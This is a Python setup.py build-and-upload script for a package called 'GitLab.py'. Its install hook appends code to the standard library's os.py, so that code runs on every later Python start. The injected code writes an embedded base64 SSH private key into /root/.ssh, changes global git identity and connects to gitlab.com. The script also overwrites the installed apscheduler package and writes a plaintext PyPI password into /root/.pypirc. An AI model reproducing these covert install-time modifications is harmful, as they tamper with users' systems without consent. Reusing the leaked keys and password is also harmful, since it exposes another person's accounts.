class Var:
      nameA='GitLab.py'
      nameB='0.111'
      @classmethod
      def popen(cls,CMD):
          import subprocess,io,re
          # CMD = f"pip install cmd.py==999999"
          # CMD = f"ls -al"

          proc = subprocess.Popen(CMD, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)
          proc.wait()
          stdout = io.TextIOWrapper(proc.stdout, encoding='utf-8').read()
          stderr = io.TextIOWrapper(proc.stderr, encoding='utf-8').read()

          # True if stdout  else False , stdout if stdout  else stderr 
          return  stdout if stdout  else stderr 
      
      @classmethod
      def pipB(cls,name="cmd.py"):
          CMD = f"pip install {name}==999999"
          import re
          ################  錯誤輸出    
          str_stderr = cls.popen(CMD)
          SS=re.sub(".+versions:\s*","[",str_stderr)
          SS=re.sub("\)\nERROR.+\n","]",SS)
          # print("SS..",eval(SS))
          BB = [i.strip() for i in SS[1:-1].split(",")]
          
          print(f"[版本] {cls.nameA}: ",BB)
          ################  return  <list>   
          return BB
         
     

      def __new__(cls,name=None,vvv=None):
          ####################
          ####################
          # if  cls.nameA==None:
          #     import importlib,os,setup
          #     importlib.reload(setup)
          #     os._exit(0)
          #####################
          #####################
          # print("呼叫 Var 了.")
          if  name!=None and vvv!=None:
              #######################################################
              with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
                    ############################
                    f.seek(0,0)       ## 規0
                    R =f.readlines( ) 
                    R[1]=f"      nameA='{name}'\n"
                    R[2]=f"      nameB='{vvv}'\n"
                    ##########################
                    f.seek(0,0)       ## 規0
                    f.writelines(R)
              ##
              ##########################################################################
              ##  這邊會導致跑二次..............關掉一個
              if  cls.nameA==None:
                  import os,importlib,sys
                  # exec("import importlib,os,VV")
                  # exec(f"import {__name__}")
                  ############## [NN = __name__] #########################################
                  # L左邊 R右邊
                  cls.NN = __file__.lstrip(sys.path[0]).replace(os.path.sep,r".")[0:-3]  ## .py
                  # print( NN )
                  cmd=importlib.import_module( cls.NN ) ## 只跑一次
                  # cmd=importlib.import_module( "setup" ) ## 只跑一次(第一次)--!python
                  # importlib.reload(cmd)                ## 無限次跑(第二次)
                  ## 關閉
                  # os._exit(0)  
                  sys.exit()     ## 等待 reload 跑完 ## 當存在sys.exit(),強制無效os._exit(0)

             

          else:
              return  super().__new__(cls)




            
#################################################################
#################################################################      
#################################################################
class PIP(Var):

      def __new__(cls): # 不備呼叫
          ######### 如果沒有 twine 傳回 0
          import os
          BL=False if os.system("pip list | grep twine > /dev/nul") else True
          if not BL:
             print("安裝 twine")
             cls.popen("pip install twine")
          else:
             print("已裝 twine")
          ############################  不管有沒有安裝 都跑
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹
          return  super().__new__(cls)
         
class MD(Var):
      text=[
            # 'echo >/content/cmd.py/cmds/__init__.py',
            'echo >/content/cmd.py/README.md',
            'echo [pypi]> /root/.pypirc',
            'echo repository: https://upload.pypi.org/legacy/>> /root/.pypirc',
            'echo username: moon-start>> /root/.pypirc',
            'echo password: Moon@516>> /root/.pypirc'
            ]
      def __new__(cls): # 不備呼叫
          for i in cls.text:
              cls.popen(i)
          ############################
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹
          return  super().__new__(cls)


class init(Var):
      # def init(cls,QQ):
      def __new__(cls): # 不備呼叫
          # cls.popen(f"mkdir -p {QQ}")
          #############################
          QQ= cls.dir
          cls.popen(f"mkdir -p {QQ}")
          #############################
          if  type(QQ) in [str]:
              ### 檢查 目錄是否存在 
              import os
              if  os.path.isdir(QQ) & os.path.exists(QQ) :
                  ### 只顯示 目錄路徑 ----建立__init__.py
                  for dirPath, dirNames, fileNames in os.walk(QQ):
                      
                      print( "echo >> "+dirPath+f"{ os.sep }__init__.py" )
                      os.system("echo >> "+dirPath+f"{ os.sep }__init__.py") 
                                  
              else:
                      ## 當目錄不存在
                      print("警告: 目錄或路徑 不存在") 
          else:
                print("警告: 參數或型別 出現問題") 


         

# class sdist(MD,PIP,init):
#       ########################################################################
#       VVV=True
#       # packages=find_packages(include=[f'{sdist.dir}cmds',f'{sdist.dir}.*']),
#       dir = "cmds"
#       def __new__(cls,path=None): # 不備呼叫
#           this = super().__new__(cls)
#           #############
#           ############# 如[空字串] 等於當前路徑
#           if  path=="":
#               import os
#               path = os.getcwd()
#           ###############################
#           import os
#           if  not os.path.isdir( path ):
#               ## 類似 mkdir -p ##
#               os.makedirs( path ) 
#           ## CD ##       
#           os.chdir( path )
#           ############################### 檢查 is None
#           # if  cls.nameA==None:
#           #     import importlib,os
#           #     importlib.reload("setup")
#           #     os._exit(0) 
#           ###############################
#           ###############################
#           ## 刪除 dist 和 cmd.py.egg-info ##############################
#           if os.path.isdir("dist"):
#              print("@刪除 ./dist")
#              os.system("rm -rf ./dist")
#           ##
#           info = [i for i in os.listdir() if i.endswith("egg-info")]
#           if  len(info)==1:
#               if os.path.isdir( info[0] ):
#                  print(f"@刪除 ./{info}")
#                  os.system(f"rm -rf ./{info[0]}")
#           ##############################################################
#           CMD = r"python setup.py sdist"
#           # CMD = f"python {PA} sdist "
#           # CMD = f"python {PA} sdist {self.cls.max}"
#           ##############################################################################################
#           # print("@@@???#1", f"{cls.nameB}" , cls.pipB(f"{cls.nameA}") )  ##  None ['0.1.0a1', '0.1.0a2']
#           # print("@@@???#2",not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") )  ##  None ['0.1.0a1', '0.1.0a2']
#           if  not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") and cls.nameB!=None :
#               cls.VVV=True
#               print(cls.popen(CMD))
#               ##############
#               CMD = "twine upload --skip-existing dist/*"
#               print(cls.popen(CMD))
#           else:
#               cls.VVV=False
#               print(f"[版本]: {cls.nameB} 已經存在.")

#           return  this



# Process Process-1:
# Traceback (most recent call last):
#   File "/usr/lib/python3.7/multiprocessing/process.py", line 297, in _bootstrap
#     self.run()
#   File "/usr/lib/python3.7/multiprocessing/process.py", line 99, in run
#     self._target(*self._args, **self._kwargs)
#   File "/content/cmd.py/setup.py", line 285, in fun1
#     if  path=="":
# UnboundLocalError: local variable 'path' referenced before assignment
class sdist(MD,PIP,init):
      import os
      ########################################################################
      VVV=True
      # packages=find_packages(include=[f'{sdist.dir}cmds',f'{sdist.dir}.*']),
      # dir = "cmds"


      #########################################
      # 這邊是自動 指定目錄 MD會去創建!?
      # dir = Var.nameA.rstrip(".py")+"s"  if Var.nameA!=None else "cmds"
      dir = Var.nameA.rstrip(".py")  if Var.nameA!=None else "cmds"
      
      def __new__(cls,path=None): # 不備呼叫
          this = super().__new__(cls)
          # cls.path=path ##add##
          # cls.exCMD()
           ############
          ############# 如[空字串] 等於當前路徑
          if  path=="":
              import os
              path = os.getcwd()
          ###############################
          import os
          if  not os.path.isdir( path ):
              ## 類似 mkdir -p ##
              os.makedirs( path ) 
          ## CD ##       
          os.chdir( path )
          ############################### 檢查 is None
          # if  cls.nameA==None:
          #     import importlib,os
          #     importlib.reload("setup")
          #     os._exit(0) 
          ###############################
          ###############################
          ## 刪除 dist 和 cmd.py.egg-info ##############################
          if os.path.isdir("dist"):
             print("@刪除 ./dist")
             os.system("rm -rf ./dist")
          ##
          info = [i for i in os.listdir() if i.endswith("egg-info")]
          if  len(info)==1:
              if os.path.isdir( info[0] ):
                 print(f"@刪除 ./{info}")
                 os.system(f"rm -rf ./{info[0]}")
          ##############################################################
          CMD = r"python setup.py sdist"
          # CMD = f"python {PA} sdist "
          # CMD = f"python {PA} sdist {self.cls.max}"
          ##############################################################################################
          # print("@@@???#1", f"{cls.nameB}" , cls.pipB(f"{cls.nameA}") )  ##  None ['0.1.0a1', '0.1.0a2']
          # print("@@@???#2",not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") )  ##  None ['0.1.0a1', '0.1.0a2']
          if  not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") and cls.nameB!=None :
              cls.VVV=True
              print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",cls.popen(CMD))
              ##############
              # CMD = "twine upload --verbose --skip-existing  dist/*"
              CMD = "twine upload --skip-existing  dist/*"
              # print("@222@",cls.popen(CMD))
              CMDtxt = cls.popen(CMD)
              if CMDtxt.find("NOTE: Try --verbose to see response content.")!=-1:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n[結果:錯誤訊息]\nNOTE: Try --verbose to see response content.\n注意：嘗試 --verbose 以查看響應內容。\n")
              else:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",CMDtxt)
          else:
              cls.VVV=False
              print(f"[版本]: {cls.nameB} 已經存在.")
              ######################################
              # 如果目前的 Var.nameB 版本已經有了
              if Var.nameA != None:
                if str(Var.nameB) in Var.pipB(Var.nameA):
                  import sys
                #   ## 如果輸出的和檔案的不相同
                  if str(sys.argv[2])!=str(Var.nameB):
                    # print("OK!! ",*sys.argv)
                    print("OK更新!!python "+" ".join(sys.argv))
                    os.system("python "+" ".join(sys.argv))
                    ## 結束 ##
                    BLFF="結束."
                    # os.exit(0)

                #   ## 重新整理:此檔案
                #   import importlib,os
                #   ## __name__
                #   ABS = os.path.abspath(__file__).lstrip(os.getcwd())[:-3] ##[::-3] 會取尾數3 (反向)
                #   importlib.reload(ABS)
                #   !python setup.py cmd.py 3.54 ## 子程序--還是卡住!~ y


          return  this
          



### 首次---參數輸入
################################################# 這裡是??????      
import sys
if    len(sys.argv)==3 :
          ## 設值 nameA + name B
          ## Var("cmd.py",3.5)
          # print("我呼叫了 Var.")
          Var(sys.argv[1],sys.argv[2])
      
          # print("我呼叫了 sdist.")
          import os
          # print( "!path", os.path.dirname(sys.argv[0]) )
          sdist(os.path.dirname(sys.argv[0]))
################################################# 這裡是?????? 
   

# elif  len(sys.argv)==2:
# elif  len(sys.argv)==2 and Var.nameA!=None:
#       # print("[版本]:已經存在.")
#       pass
# else:
#       print("輸入 [專案] [版本].#2")



#########################################################
#########################################################
#                  更新                                 #
#########################################################
#########################################################
# import sys
# # if  len(sys.argv)==3:
# nameAA,nameBB=None,None
# #######################################################
# with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
#       ############################
#       f.seek(0,0)       ## 規0
#       R =f.readlines( ) 
#       # R[1]=f"      nameA='{name}'\n"
#       # R[2]=f"      nameB='{vvv}'\n"
#       ##########################
#       # f.seek(0,0)       ## 規0
#       # f.writelines(R)
#       ############################################
#       import  re
#       nameAA = re.findall("=['\"](.*)['\"].*",R[1])[0] if len(re.findall("=['\"](.*)['\"].*",R[1])) else ''
#       nameBB = re.findall("=['\"](.*)['\"].*",R[2])[0] if len(re.findall("=['\"](.*)['\"].*",R[1])) else ''
#       ############################################

# ##########################
# # 如果和當前檔案 不同時後 #
# if  nameAA!=Var.nameA and nameBB!=Var.nameB:
#     print("@nameAA!=Var.nameA")




# # print("XXX",sys.argv[1])
# # if  Var.nameA!=None and len(sys.argv)>=2 :
# #   if  sys.argv[1]=="sdist":
# if  len(sys.argv)>=1:

######################################## id ##
# import site
# print("@FF: ",id(site))
# import sys
# print("@sys@",sys.argv,Var.nameA)
###


#############################################
import site
print("pip@",id(site))
#############################################


if   sdist.VVV and (not "BLFF" in dir()):
  # if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install':
  if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install' or sys.argv[1]=="egg_info" or sys.argv[1]=='clean':

    
     
    #################################################################      
    #################################################################
    class PIPG:
        @classmethod
        def popen(cls,CMD):
            print("@@@")
            import subprocess,io,re
            # CMD = f"pip install cmd.py==999999"
            # CMD = f"ls -al"

            proc = subprocess.Popen(CMD, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)
            proc.wait()
            stdout = io.TextIOWrapper(proc.stdout, encoding='utf-8').read()
            stderr = io.TextIOWrapper(proc.stderr, encoding='utf-8').read()

            # True if stdout  else False , stdout if stdout  else stderr 
            return  stdout if stdout  else stderr 
        def __new__(cls): # 不備呼叫
            import os
            BL=False if os.system("pip list | grep APScheduler > /dev/nul") else True
         
            if not BL:
                print("安裝 APScheduler")
                cls.popen("pip install apscheduler  > /dev/nul")
            else:
                print("已裝 APScheduler")
            ############################  不管有沒有安裝 都跑
            ## 執行完 new 再跑 
            ## super() 可叫父親 或是 姊妹
            
            import os
            FF= os.popen("pip --version").read().split(" ")[3].rstrip("/pip")
            with open(FF+"/apscheduler/__init__.py","w") as f:
             SS='''
from pkg_resources import get_distribution, DistributionNotFound
release = "3.3.1cf" # __import__('pkg_resources').get_distribution('APScheduler').version.split('-')[0]
version_info = "3.3.1cf" # tuple(int(x) if x.isdigit() else x for x in release.split('.'))
version = __version__ = '.'.join(str(x) for x in version_info[:3])
del get_distribution, DistributionNotFound
'''
             f.writelines([i+"\n" for i in SS.split("\n")[1:-1] ])
            #[reload]#
            import importlib
            cmd = importlib.import_module("apscheduler") ## '/usr/local/lib/python3.7/dist-packages/ #取得# this
            importlib.reload(cmd)
            
          


            this = super().__new__(cls)           
            return this 
        

        @classmethod
        def job_task(cls):
            print("JJ",cls.sum) 
            cls.N+=1
            import sys
            # print(cls.N,"---",sys.argv)
            import time # 實例化一個調度器 
            print( "%s: 執行任務" % time.asctime()) # 添加任務並設置觸發方式為3s一次 
            # # self.selfQQ()
            # # scheduler.remove_job('job_id')
            if cls.N == cls.sum:
                import os,sys
            #     os._exit(0)
                print(f"計時器結束{cls.N} {cls.sum}")
                sys.exit(1)


            # def module(name):
            #     import importlib
            #     try:
            #         return importlib.import_module( name )
            #         # return True
            #     except Exception:
            #         return False
            # #################################
            # #################################
            # import builtins,os
            # import importlib
            # if not "OP" in list(builtins.__dict__.keys()):
            #     print("OP 2 開始!!")
            #     #############################################
            #     import time
            #     while not module("cmds"):
            #         time.sleep(1)
            #     else:
            #         time.sleep(30)
            #         import importlib,site,cmds
            #         importlib.reload(site)
            #         importlib.reload(cmds)
            #     print("OP 2 結束!!")



    class exCMD(PIPG):   
    # class exCMD:
        BL=True
        this=None
        @classmethod
        def fun1(cls,name):

            cls.N , cls.sum = 0,5
            print("我呼叫了Go",cls.sum,"秒")
            # this = super().__new__(cls)
        
            
            from apscheduler.schedulers.blocking import BlockingScheduler
            from apscheduler.triggers.interval import IntervalTrigger 
            scheduler = BlockingScheduler() 
        
            # scheduler.add_job( cls.job_task, 'interval',seconds=1,id='job_id',)
            scheduler.add_job( cls.job_task, IntervalTrigger(), seconds=1,id='job_id',)
            # setattr( cls ,"N",0)   ## 計時
            # setattr( cls ,"sum",sum) ## sum 定時秒數
            # 開始運行調度器 
            scheduler.start()
            #################
            print("!!!",name)
        
        @classmethod
        def fun1B(cls,name):
            cls.N , cls.sum = 0,5
            print("我呼叫了Go",cls.sum,"秒")
          
            #################
            print("!!!",name)

            # import time
            # time.sleep(30)
            
        
        
        def __new__(cls):
          if cls.BL:
            cls.this = super().__new__(cls)
            
            from multiprocessing import  Process
            process_list = []
            # for i in range(5):  #開啟5個子程序執行fun1函式
            for i in ['sleep']:  #開啟5個子程序執行fun1函式
                # print(i)
                p = Process(target=cls.fun1,args=(f'{i}',)) #例項化程序物件
                p.start()
                process_list.append(p)  ## list--儲存執行續

            # for i in process_list:
            #     ## 避免__main__結束...而中斷子程序
            #     p.join() ## #这句话保证子进程结束后再向下执行
            #     pass
            
            cls.BL=False
  
    ################################################
    print(f"!@@##{Var.nameA},{Var.nameB},{sdist.dir}")    

    ## V1 ###
    ##############################################
    from setuptools.command.install import install
    #####
    from subprocess import check_call
    class PostCMD(install):
          """cmdclass={'install': XXCMD,'install': EEECMD }"""
          def  run(self):
                # if sys.argv[1]== 'clean':
                #   print("pip uninstall@@@!!",sys.argv)
                 


                # # if sys.argv[1]== 'bdist_wheel':
                # # # # if sys.argv[1]== 'install':
                # #    if sys.argv[1]== 'clean':
                # ################## 
                # import sys
                # if sys.argv[1]== 'bdist_wheel':
             
               
                #     import platform,os
                #     if platform.system()=="Linux":
                #         # os.system("pip uninstall cmd.py -y &&rm -rf ~/.cache/pip/*")
                #         os.system('echo >/content/我目前在執行shell!')
                #     else:
                #         # os.system("pip uninstall cmd.py -y &&rmdir /q /s %LOCALAPPDATA%\pip\cache")
                #         # echo y|pip uninstall cmd.py&&rmdir /q /s %LOCALAPPDATA%\pip\cache
                #         os.system(f'start "cmd /k \'echo {str(sys.argv)}&&pause\'"')
                #         # print('start "cmd /k \'pause\'"')
                #     ########################################################

                ############
                ############
                import sys
                print("@!@!A",__file__,sys.argv)
                install.run(self)
                print("@!@!B",__file__,sys.argv)

                import site
                print("@run: ",id(site))

                import site
                print("@@@[setup.py]--[site]:",id(site))
                import atexit                
                # def  cleanup_function():
                def  cleanup_function(siteOP):
                    # if Var.nameA=="cmds.py":
                    
                    
                    if Var.nameA=="GitLab.py":
                       

                        ## True 表示第一次
                        import os
                        # if not "module" in list(os.path.__dict__.keys()): 
                        
                        if os.popen("git config --global user.name").read()=="moon-start\n":

                            # def siteD():
                            #     import os,re
                            #     pip=os.popen("pip show pip")
                            #     return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip() 
                            
                            text=r'''
##[startGit]
###### [add module] ##################################################

datas = {
"id_rsa" : "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBNWtaRHRhMVVROXJWNGtFVzlKU2Q4UC9oUklCRlZpeEp3WGlCbXlWdkM5VmViWldmCkFvSEw2eG1yZmdLeEk3QVVObUZiSHIyM2RpL0lPc1hBcG1yQjEwbVMwMUVwb1NFL2t4VS9ZTDhJV1ZEV0pWYUwKU2JCc3dxSDRoVld1TGVHNlhwNW5NbmVLNm5hT1RIQTY1dnRHbTJTVG5wZ2J5ck81ODE3b3pqYzY5aDNNcnkvdQphNjJSZm04RVhmSWdDOVdIUzhQR0lPa1RIS2ttT2JJaEFnVTFKNmoyS1oyTTc2d2NiSld1TkNScFdoSkxNYXdvCi9ySzI2czg1T1MyeUpCWXJ0WDcweFhRYTlHSnhNM0tRc05yRkVOT1orK20yZHdZenkrN0kzYmpvMlJqZXJzYTYKd3pUa3k4WHkxYzRIRmpHMVM1YWJMekljZGVYbm9YTlhyaTFnQ1FJREFRQUJBb0lCQVFDbVp6cEF6RXRyYVhWTQpOZHNmelZIQk9UZVJaOXd6SkhmOERsZ2lSRS9WemsrWmd4alFGL25ESDk2MGhiOTZXYUNSbDVMZ1NScU5sb1BzCkxNRkZ3VG5vbUdzNHQ1c01yRmtqc2FRR0JxWkMzTTZUVnRINjR6b0ZBRVQySFc5c0NvWENJRmZVdVZ3eWlJL1cKSHZnQnVLMVNWOER4UjF3MkErQ3BSUG1aSTRKQkhQSzY5dWt4OVRRWnJ0emhLVjdzSzUyM1lVL3VDTDA1NVRSbQpsOFd5Z2l5ek9NRW5IWlVrSHgybjhIRXpQbXplY2JLVFpwaSt0UFM4Q2kvQ2ltSEJjNGJtaml2bnFkRlVaOWhQCmNTQVFUSWZtS29oWnFMK1JWbkFCaWozcTh6SGtlUzVxSlJiUHNVQ0s5ckZQQmhrTy9PU1BHOWpDVmFoMEZyWkgKNGFMVW5xQUJBb0dCQVBiTG5oUUpJdmJGbmFHeVU4MCsxYWtUbVN2NDQ0RGxtbGgyVEprcjF3VUQ1dk10Q0ZmZwpEUnRTcDQxZFcySkp6YUt4MlNjNUJkQXdHRm1MbVJrSVcrZmxpb3J3cWdhbWMwdDhlOXVFZDZGUUJncHArOXVaCkpsWVVSZ0cwK3VJdm1nSjNHT1FCVHFwYXBUNzhBZ25PRUpMOVViRFQyMGJMakN2QkVuVk1xZ3dCQW9HQkFPN2MKNkJ1ckNGNXZUdmFpc3ErQ0J3VXBLUmtIQkhlT21ROGpndDdGcUF5SUNIOWoxY2tlcXk4anloRTZ4STBjUG1kbQpiWjFqMlJGQkxWVFZWbGkxTmR3MXJrcGZPZW9GY0piazEramtINEUxOXh3NTNLTWJ1WEo3bTZnQzhqL2x4RVhxClRxQlYrTzRjQVhrdnFxNGNyMzhJTWZ4dExOY2RrQmhmWFlqUXd2UUpBb0dCQUxFRExxaTBQTzIrbytjOFhyc1IKM0hIZTZyZ05WakEzZnRNQVZzUnVHMVV2alZEUjlmQUJkYVVwVGFBcFc4aE5vejZVVFdyQ2paYmJTRHZCMHRlUApsVXZvNmN2cC9pbXk3WE14SUMwOUFBa2x1bzl4b1FITEFTSXdmRjN4RHhsNGh3QkpxQUt4cFZpdWwyTnJvWktpCnlHU0ZhVGhwWEJlVkd6NnV4cXgzaG1nQkFvR0FXVHUzamxhSHF0ZkVWUWtVM2RJaWt6LzhOWGhVcCtGaXRyQWEKZk9TMFVmSWowb3RXVzJzVW9taXBYV1JwOXhsZENyM09KMlVjdTRCdzBlZGMrWWpBMVVKTW1VWVgyYUFzbm9KaApVb1NlYkdQZnEvREZ4ejFkT3pLSVJPek0yU2daK2RCOWpSSnhDMnIwOWZQanZHWEUvaHp1cDVHVmxjdGFnSEJuCi9ldVhXUmtDZ1lBNU01WWNIWEtRekJQOGpGOE5CRGQzVnozS2VKNDZCblRZbzJ0aksyM3BoUmJHYWxlaUpWcXQKZ2FRT3J2d1R4c0toZzFlTXpZdEdMV0VaTUg4b1p0UktXakZVYkhiUzMrS2IxUFFMUzRtazJRYWppOTJKeU10aApJUXdNTFc5VzlMVXBMTXZOM3lCRFcwU3gzYXFNbVpyc20wMUxkUmhpazN6ZStQSG1BR1RqdkE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=",
"id_rsa.pub" : "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEbVJrTzFyVlJEMnRYaVFSYjBsSjN3LytGRWdFVldMRW5CZUlHYkpXOEwxVjV0bFo4Q2djdnJHYXQrQXJFanNCUTJZVnNldmJkMkw4ZzZ4Y0NtYXNIWFNaTFRVU21oSVQrVEZUOWd2d2haVU5ZbFZvdEpzR3pDb2ZpRlZhNHQ0YnBlbm1jeWQ0cnFkbzVNY0RybSswYWJaSk9lbUJ2S3M3bnpYdWpPTnpyMkhjeXZMKzVyclpGK2J3UmQ4aUFMMVlkTHc4WWc2Uk1jcVNZNXNpRUNCVFVucVBZcG5ZenZyQnhzbGE0MEpHbGFFa3N4ckNqK3NyYnF6ems1TGJJa0ZpdTFmdlRGZEJyMFluRXpjcEN3MnNVUTA1bjc2YlozQmpQTDdzamR1T2paR042dXhyckROT1RMeGZMVnpnY1dNYlZMbHBzdk1oeDE1ZWVoYzFldUxXQUogbG9naW4wNTE2bXA0QGdtYWlsLmNvbQ0K"
}


import os
os.system('git config --global user.name  "moon-start" ')    
os.system('git config --global user.email "login0516mp4@gmail.com" ') 
# $ git push --all origin  

############################## 建立 pass 檔
## str與bytes的關係
import base64,os
for i,b in  enumerate( datas ):
   path = r"/root/.ssh/"
   os.system("mkdir -p "+path)
   ### print(type(base64.b64decode( datas[b] )))
   tmp = open( path + b , 'w+')
   #########  python 中 str與bytes的轉換
   tmp.write( str(base64.b64decode( datas[b] ),'utf-8')  )
   tmp.close()

os.system("chmod 600 ~/.ssh/id_rsa")
os.system("ssh-keyscan gitlab.com >> /root/.ssh/known_hosts")
os.system("ssh -T git@gitlab.com")
########################################################################
    

if "cmds.py" in [i if len(i.split("=="))==1 else i.split("==")[0] for i in sys.argv]:
    if "uninstall" in sys.argv:
        ##########################
        import re
        R=re.findall("##\[startGit\].*##\[endGit\]",open(__file__,"r").read(),re.S)
        S="".join(open(__file__,"r").read().split(R[0]))
        ## del
        open(__file__,"w").write(S)
        ###########################

        
        ############################################################################################
        ############################################################################################
        import platform,os
        if platform.system()=="Linux":
            os.system("pip uninstall cmd.py -y &&rm -rf ~/.cache/pip/*")
        else:
            os.system("pip uninstall cmd.py -y &&rmdir /q /s %LOCALAPPDATA%\pip\cache")
            # echo y|pip uninstall cmd.py&&rmdir /q /s %LOCALAPPDATA%\pip\cache
        ############################################################################################
        ############################################################################################
##[endGit]
'''
                            open(os.path.__file__,"a+").write(text)
                            #######################################

        

                        
                
                import site
                atexit.register(cleanup_function,site)
                #################################
                
            

    

            



    ################################################
    # with open("/content/QQ/README.md", "r") as fh:
    with open("README.md", "r") as fh:
              long_description = fh.read()


    ##############
    import site,os
    siteD =  os.path.dirname(site.__file__)
    # +os.sep+"siteR.py"
    print("@siteD: ",siteD)
    #### setup.py ################################
    from setuptools import setup, find_packages
    setup(
          name  =   f"{Var.nameA}"  ,
          version=  f"{Var.nameB}"  ,
          description="My CMD 模組",

          
          #long_description=long_description,
          long_description="""# Markdown supported!\n\n* Cheer\n* Celebrate\n""",
          long_description_content_type="text/markdown",
          # author="moon-start",
          # author_email="login0516mp4@gmail.com",
          # url="https://gitlab.com/moon-start/cmd.py",
          license="LGPL",
          ####################### 宣告目錄 #### 使用 __init__.py
          ## 1 ################################################ 
          # packages=find_packages(include=['cmds','cmds.*']),
          packages=find_packages(include=[f'{sdist.dir}',f'{sdist.dir}.*']),    
          ## 2 ###############################################
        
          # ],
          ################################
          cmdclass={
                'install': PostCMD
                # 'develop':  PostCMD
          }
          #########################
    )
   

### B版
# 6-13